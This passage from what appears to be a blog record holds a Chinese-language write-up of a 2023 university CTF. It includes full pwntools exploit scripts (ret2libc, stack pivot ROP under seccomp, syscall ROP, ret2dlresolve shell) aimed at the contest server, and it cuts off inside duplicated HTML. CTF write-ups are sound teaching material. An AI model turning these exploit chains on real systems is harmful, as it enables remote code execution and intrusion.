0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401360 : pop r14 ; pop r15 ; ret\n# 0x0000000000401362 : pop r15 ; ret\n# 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040119d : pop rbp ; ret\n# 0x0000000000401363 : pop rdi ; ret\n# 0x0000000000401361 : pop rsi ; pop r15 ; ret\n# 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040127e : ret 0x14\n# 0x00000000004012e7 : ret 0x200\n \n# 0x00000000004012ba : ret 0x4c\n# 0x000000000040129c : ret 0x50\n# offset in libc\n# 0x0000000000036174 : pop rax ; ret\n```\n\n### close\nQ:你leak不了一点！hacker！！\nA:？？？？？？\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png)\n既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。\n于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。\n于是考虑使用ret2dlresolve来调用shell。\n这里使用生成的payload\n原本是想用system(\"/bin/sh\")的，但是发现system好像有些神秘问题导致显示：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png)\n于是采用execve(\"/bin/sh\",0,0)来获取shell\n但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png)\n所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了\n之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1>&2\nhint:网上关于标准输出被关闭的情况，有教程：exec 1>&0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\ncontext.binary = elf = ELF(\"./pwn\")\nrop = ROP(context.binary)\ndlresolve = Ret2dlresolvePayload(elf,symbol=\"execve\",args=[\"/bin/sh\",0])\nrop.read(0,dlresolve.data_addr)\nrop.ret2dlresolve(dlresolve)\nraw_rop = rop.chain()\n# io = process(\"./pwn\")\n# io=process(['./ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":'./libc.so.6'})\n# io=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\nio=remote('8.130.110.158',7001)\n# gdb.attach(io)\npayload0 = flat({0x98:raw_rop})\nio.sendlineafter('name',\"fuck\")\npayload1=b'a'*0x90+p64(0x404e90)+p64(0x40127c)\nio.sendlineafter('response',payload1)\npause()\nio.sendline(dlresolve.payload.ljust(0x90,b'\\x00')+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got['alarm'])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])\n# pause()\n# io.sendline(dlresolve.payload)\n# io=remote('8.130.110.158',7001)\nio.sendline(b\"exec 1>&2\")\nio.sendline(b\"ls\")\nio.interactive()\n \n# 0x404e90\n# 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401320 : pop r14 ; pop r15 ; ret\n# 0x0000000000401322 : pop r15 ; ret\n# 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401323 : pop rdi ; ret\n# 0x0000000000401321 : pop rsi ; pop r15 ; ret\n# 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n","source":"_posts/NEUQCSA/NEUQCSA-10月月赛题解.md","raw":"---\ntitle: \"NEUQCSA-2023-10月赛题解\"\ncategories: NEUQCSA\ntag: Pwn\n---\nmarkdown出问题的话直接看链接：https://zcoi.github.io/blogs/CTF/monthgame2310/\n# 解题情况\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/web.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png)\n\n\n# 解题思路\n## Misc\n### level1-Login\n直接看html，发现base64加密的一串。直接解密就是flag\n\n\n\n## PWN\n### ret2libc\nQ:请嗯造libc\nA:我嗯造libc\n\n```python\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\np=remote('8.130.110.158',2110)\n \nfunc_addr=elf.got['write']\nwrite_addr=elf.plt['write']\n \npop_rdi=0x4012a3\npop_rsi2=0x4012a1\nret=0x40101a\nvuln=0x4011db\n \npayload= b'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadbeef)+p64(write_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['write']\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\n \npause()\npayload=b'a'*0x10+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)\np.sendlineafter('voice :',payload)\n \np.interactive()\n \n# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x00000000004012a0 : pop r14 ; pop r15 ; ret\n# 0x00000000004012a2 : pop r15 ; ret\n# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040115d : pop rbp ; ret\n# 0x00000000004012a3 : pop rdi ; ret\n# 0x00000000004012a1 : pop rsi ; pop r15 ; ret\n# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n### Stack_Migration\n字面意思，栈可以到处跑\n正常审题程序不再罗列（checksec、IDA看字符串啥的）。\nIDA中发现有沙箱\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png)\n依旧是发现栈溢出。\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png)\n考虑到没法直接执行shellcode，因此只能构建ROP链。实现以下功能：\n```c\nchar*file='flag';\nopen(file,0,0);\nread(3,file,0x30);\nwrite(1,file,0x30);\n```\n这里把存储flag文件的名称和栈迁移之后的ROP链一起读入到bss那里。毕竟空间充足。\n```python\nfrom pwn import*\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2109)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\n \nbss_st=0x4040A0\nbss_tar=0x4040A0+0x200\nflag_name=0x4040a0+0x200-8\nflag_addr=bss_st+0x300-0x40\n \npop_rdi=0x401373\npop_rsi2=0x401371\nleave=0x4012e6\n \nfunc_addr=elf.got['read']\nwrite_addr=elf.plt['write']\nread_addr=elf.plt['read']\nvuln=0x401279\n \npayload1=b'a'*(0x200-0x8)+b'flag\\x00\\x00\\x00\\x00'+p64(bss_tar+0x100)+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(write_addr)+p64(0x4012a3)\np.sendlineafter('everywhere',payload1)\n \nmigr_pay=b'a'*0x8+p64(bss_tar)+p64(leave)\np.sendafter('voice :',migr_pay)\np.recv()\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['read']\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npause()\npayload2=p64(bss_st+0x100)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(open64_addr)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(read_addr)\npayload2+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_addr)+p64(pop_rdx)+p64(0x30)+p64(write_addr)+p64(vuln)\np.sendline(payload2)\n \nmigr_pay=b'a'*0x8+p64(bss_st)+p64(leave)\np.sendafter('voice :',migr_pay)\n \np.interactive()\n \n# 0x000000000040136c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401370 : pop r14 ; pop r15 ; ret\n# 0x0000000000401372 : pop r15 ; ret\n# 0x000000000040136b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040136f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401373 : pop rdi ; ret\n# 0x0000000000401371 : pop rsi ; pop r15 ; ret\n# 0x000000000040136d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040121a : ret 0xfffe\n \n# in libc\n# 0x0000000000142c92 : pop rdx ; ret\n# 0x000000000002601f : pop rsi ; ret\n```\n### call me sys\nsyscall，但是只能用几个函数\n又是沙箱：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis1.png)\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2seccomp.png)\n还是栈溢出漏洞：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/2dis2.png)\n由于没有关掉open,write,read函数，所以这题思路和上题一样。（题目说有三种方法，日后钻研）\n```python\nfrom pwn import*\n \ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\nelf=ELF('./pwn')\nlibc=ELF('./libc-2.31.so')\np=remote('8.130.110.158',2111)\n# p=process('./pwn')\n# p=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\n# gdb.attach(p)\nfunc_addr=elf.got['setvbuf']\nsyscall_ret=0x4012ec\npop_rdi=0x401363\npop_rsi2=0x401361\n \np.sendline(\"000\")\npayload=b'a'*0x78+p64(pop_rdi)+p64(1)+p64(pop_rsi2)+p64(func_addr)+p64(0xdeadfeef)+p64(0x401291)\npause()\np.sendline(payload)\np.recvuntil(b'./f1ag')\np.recv(2)\n# p.recvuntil(b'./f1ag\\x00\\x00\\x00')\nfunc_addr=u64(p.recv(6).ljust(8,b'\\x00'))\nbase=func_addr-libc.symbols['setvbuf']\nprint(hex(func_addr))\nprint(hex(base))\nsystem_addr=base+libc.symbols['system']\nprintf_addr=base+libc.symbols['printf']\nsh=base+next(libc.search(b'/bin/sh'))\nopen64_addr=base+libc.symbols['open64']\n \nflag_name=0x4040e0\npop_rdx=0x142c92+base\npop_rsi=0x2601f+base\npop_rax=0x36174+base\n \npayload=b'flag\\x00\\x00\\x00\\x00'\npause()\np.send(payload)\n \npayload=b'a'*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)\npause()\np.send(payload)\n \np.interactive(0)\n \n# 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401360 : pop r14 ; pop r15 ; ret\n# 0x0000000000401362 : pop r15 ; ret\n# 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x000000000040119d : pop rbp ; ret\n# 0x0000000000401363 : pop rdi ; ret\n# 0x0000000000401361 : pop rsi ; pop r15 ; ret\n# 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n# 0x000000000040127e : ret 0x14\n# 0x00000000004012e7 : ret 0x200\n \n# 0x00000000004012ba : ret 0x4c\n# 0x000000000040129c : ret 0x50\n# offset in libc\n# 0x0000000000036174 : pop rax ; ret\n```\n\n### close\nQ:你leak不了一点！hacker！！\nA:？？？？？？\n依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png)\n既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。\n于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。\n于是考虑使用ret2dlresolve来调用shell。\n这里使用生成的payload\n原本是想用system(\"/bin/sh\")的，但是发现system好像有些神秘问题导致显示：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png)\n于是采用execve(\"/bin/sh\",0,0)来获取shell\n但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：\n![](https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png)\n所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了\n之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1>&2\nhint:网上关于标准输出被关闭的情况，有教程：exec 1>&0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux')\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h']\ncontext.binary = elf = ELF(\"./pwn\")\nrop = ROP(context.binary)\ndlresolve = Ret2dlresolvePayload(elf,symbol=\"execve\",args=[\"/bin/sh\",0])\nrop.read(0,dlresolve.data_addr)\nrop.ret2dlresolve(dlresolve)\nraw_rop = rop.chain()\n# io = process(\"./pwn\")\n# io=process(['./ld-linux-x86-64.so.2', './pwn'], env={\"LD_PRELOAD\":'./libc.so.6'})\n# io=process(['./ld-2.31.so', './pwn'], env={\"LD_PRELOAD\":'./libc-2.31.so'})\nio=remote('8.130.110.158',7001)\n# gdb.attach(io)\npayload0 = flat({0x98:raw_rop})\nio.sendlineafter('name',\"fuck\")\npayload1=b'a'*0x90+p64(0x404e90)+p64(0x40127c)\nio.sendlineafter('response',payload1)\npause()\nio.sendline(dlresolve.payload.ljust(0x90,b'\\x00')+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got['alarm'])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])\n# pause()\n# io.sendline(dlresolve.payload)\n# io=remote('8.130.110.158',7001)\nio.sendline(b\"exec 1>&2\")\nio.sendline(b\"ls\")\nio.interactive()\n \n# 0x404e90\n# 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret\n# 0x0000000000401320 : pop r14 ; pop r15 ; ret\n# 0x0000000000401322 : pop r15 ; ret\n# 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret\n# 0x00000000004011bd : pop rbp ; ret\n# 0x0000000000401323 : pop rdi ; ret\n# 0x0000000000401321 : pop rsi ; pop r15 ; ret\n# 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n# 0x000000000040101a : ret\n```\n","slug":"NEUQCSA/NEUQCSA-10月月赛题解","published":1,"date":"2023-11-04T07:04:58.363Z","updated":"2023-11-04T10:38:54.707Z","_id":"clojw0f8q0001g4aihvkg496k","comments":1,"layout":"post","photos":[],"content":"<p>markdown 出问题的话直接看链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly96Y29pLmdpdGh1Yi5pby9ibG9ncy9DVEYvbW9udGhnYW1lMjMxMC8=\">https://zcoi.github.io/blogs/CTF/monthgame2310/</span></p>\n<h1 id=\"解题情况\"><a class=\"anchor\" href=\"#解题情况\">#</a> 解题情况</h1>\n<p><img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/self2.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/misc.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/web.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/pwn.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/cry.png\" alt=\"\" /></p>\n<h1 id=\"解题思路\"><a class=\"anchor\" href=\"#解题思路\">#</a> 解题思路</h1>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"level1-login\"><a class=\"anchor\" href=\"#level1-login\">#</a> level1-Login</h3>\n<p>直接看 html，发现 base64 加密的一串。直接解密就是 flag</p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ret2libc\"><a class=\"anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<p>Q: 请嗯造 libc<br />\nA: 我嗯造 libc</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2110</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">func_addr=elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">write_addr=elf.plt[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x4012a3</span></span><br><span class=\"line\">pop_rsi2=<span class=\"number\">0x4012a1</span></span><br><span class=\"line\">ret=<span class=\"number\">0x40101a</span></span><br><span class=\"line\">vuln=<span class=\"number\">0x4011db</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload= <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(<span class=\"number\">1</span>)+p64(pop_rsi2)+p64(func_addr)+p64(<span class=\"number\">0xdeadbeef</span>)+p64(write_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;voice :&#x27;</span>,payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">func_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base=func_addr-libc.symbols[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">system_addr=base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">printf_addr=base+libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sh=base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"> </span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;voice :&#x27;</span>,payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a0 : pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a2 : pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040115d : pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a3 : pop rdi ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x00000000004012a1 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class=\"line\"><span class=\"comment\"># 0x000000000040101a : ret</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"stack_migration\"><a class=\"anchor\" href=\"#stack_migration\">#</a> Stack_Migration</h3>\n<p>字面意思，栈可以到处跑<br />\n正常审题程序不再罗列（checksec、IDA 看字符串啥的）。<br />\nIDA 中发现有沙箱<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis1.png\" alt=\"\" /><br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1seccomp.png\" alt=\"\" /><br />\n依旧是发现栈溢出。<br />\n<img data-src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/1dis2.png\" alt=\"\" /><br />\n考虑到没法直接执行 shellcode，因此只能构建 ROP 链。实现以下功能：<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span>*file=<span class=\"string\">&#x27;flag&#x27;</span>;</span><br><span class=\"line\">open(file,<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">read(<span class=\"number\">3</span>,file,<span class=\"number\">0x30</span>);</span><br><span class=\"line\">write(<span class=\"number\">1</span>,file,<span class=\"number\">0x30</span>);</span><br></pre></td></tr></table></figure><br />\n 这里把存储 flag 文件的名称和栈迁移之后的 ROP 链一起读入到 bss 那里。毕竟空间充足。<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;8.130.110.158&#x27;</span>,<span class=\"number\">2109</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">bss_st=<span class=\"number\">0x4040A0</span></span><br><span class=\"line\">bss_tar=<span 